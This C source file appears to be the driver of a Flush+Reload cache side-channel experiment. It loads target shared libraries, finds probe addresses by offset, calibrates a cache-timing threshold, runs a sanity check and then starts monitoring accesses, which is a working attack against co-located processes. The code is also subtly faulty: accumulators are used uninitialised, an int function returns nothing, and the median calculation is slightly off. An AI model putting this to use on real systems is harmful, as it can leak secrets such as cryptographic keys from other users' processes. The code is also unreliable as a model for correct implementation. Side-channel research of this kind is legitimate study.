#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <dlfcn.h>

#include "global.h"
#include "flush_reload.h"
#include "utils.h"
#include "experiment.h"

// #define COMPACT_LOG
int compare_ints(const void *p, const void *q) {
    int x = *(const int *)p;
    int y = *(const int *)q;

    /* Avoid return x - y, which can cause undefined behaviour
       because of signed integer overflow. */
    if (x < y)
        return -1;  // Return -1 if you want ascending, 1 if you want descending order.
    else if (x > y)
        return 1;   // Return 1 if you want ascending, -1 if you want descending order.

    return 0;
}

void calibrateFnr(MEM_ADDR target_addr) {
    int i;
    int rounds = 1000;
    REGISTER ts;
    int * tm = malloc(1000 * sizeof(int));
    int * th = malloc(1000 * sizeof(int));

    int th_med, tm_med;
    int th_avg, tm_avg;

    for (i = 0; i < rounds; i++) {
        FLUSH_RELOAD(target_addr, ts);
        tm[i]= ts;
        tm_avg += ts;
    }

    for (i = 0; i < 1000; i++) {
        FLUSH_RELOAD(target_addr, ts);
        th[i] = ts;
        th_avg += ts;
        LOAD(target_addr);
    }

    th_avg /= rounds;
    tm_avg /= rounds;

    qsort(tm, rounds, sizeof(int), &compare_ints);
    qsort(th, rounds, sizeof(int), &compare_ints);
    tm_med = (tm[rounds/2] + tm[rounds/2 + 1]) / 2;
    th_med = (th[rounds/2] + th[rounds/2 + 1]) / 2;

    fprintf(stderr, "%d\t%d\n", th_avg, tm_avg);
    fprintf(stderr, "%d\t%d\n", th_med, tm_med);

    FNR_THRESHOLD = (tm_med + th_med * 1) / 2;
    fprintf(stderr, "FNR_THRESHOLD: %d\n", FNR_THRESHOLD);

    free(tm);
    free(th);
}

int sanityCheck(MEM_ADDR target_addr) {
    int i;
    uint64_t ts, t0, t1, c0, c1;
    float mr, tsv, tv, cv;

    mr = tsv = tv = cv = 0.0;
    for (i = 0; i < 1000; i++) {
        c0 = getTime(); RDTSCP(t0);
        FLUSH_RELOAD(target_addr, ts);
        RDTSCP(t1); c1 = getTime();
        if (ts > FNR_THRESHOLD)
            mr += 0.001;
        tsv += ts * 0.001;
        tv += (t1 - t0) * 0.001;
        cv += (c1 - c0) * 0.001;
    }
    fprintf(stdout, "%.02f\t%.02f\t%.02f\t%.02f\n", mr, tsv, tv, cv);

    mr = tsv = tv = cv = 0.0;
    for (i = 0; i < 1000; i++) {
        c0 = getTime(); RDTSCP(t0);
        FLUSH_RELOAD(target_addr, ts);
        RDTSCP(t1); c1 = getTime();
        if (ts > FNR_THRESHOLD)
            mr += 0.001;
        tsv += ts * 0.001;
        tv += (t1 - t0) * 0.001;
        cv += (c1 - c0) * 0.001;
        LOAD(target_addr);
    }
    fprintf(stdout, "%.02f\t%.02f\t%.02f\t%.02f\n", mr, tsv, tv, cv);
    fflush(stdout);
}

int main(int argc, char** argv) {
    fprintf(stderr, "FNR_YIELD = %d\n", FNR_YIELD);

    int affinity = 3;
    char targetLibName[100] = TARGET_LIB;
    unsigned int targetCidxOffset = TARGET_CIDX_OFFSET;
    char targetLibNameEnd[100] = TARGET_LIB;
    unsigned int targetCidxOffsetEnd = TARGET_CIDX_OFFSET;
    if (argc < 7) {
        fprintf(stderr, "Usage: %s affinity logFile libBegin cidxBegin libEnd cidxEnd\n", argv[0]);
        exit(1);
    }

    affinity = atoi(argv[1]);
    strcpy(log_file, argv[2]);
    strcpy(targetLibName, argv[3]);
    sscanf(argv[4], "%x", &targetCidxOffset);
    fprintf(stderr, "%s %#x\n", targetLibName, targetCidxOffset);
    strcpy(targetLibNameEnd, argv[5]);
    sscanf(argv[6], "%x", &targetCidxOffsetEnd);
    fprintf(stderr, "%s %#x\n", targetLibNameEnd, targetCidxOffsetEnd);

    setAffinity(affinity);

    MEM_ADDR targetLib = dlopen(targetLibName, RTLD_NOW | RTLD_GLOBAL);
    MEM_ADDR targetAddr = locate_flush_reload_target(targetLibName, targetCidxOffset);

    MEM_ADDR targetLibEnd = dlopen(targetLibNameEnd, RTLD_NOW | RTLD_GLOBAL);
    MEM_ADDR targetAddrEnd = locate_flush_reload_target(targetLibNameEnd, targetCidxOffsetEnd);

    fprintf(stderr, "%#llx %#llx\n", targetAddr, targetAddrEnd);

    /*
    MEM_ADDR targetPhysAddr;
    FILE * pagemap_fp = fopen("/proc/self/pagemap", "rb");
    getPhyAddrs(pagemap_fp, &targetAddr, &targetPhysAddr, 1);
    fprintf(stderr, "Target phys addr:\t%llx\n", targetPhysAddr);
    */

    calibrateFnr(targetAddr);
    sanityCheck(targetAddr);

    runFnrBE(targetAddr, targetAddrEnd);

    return 0;
}
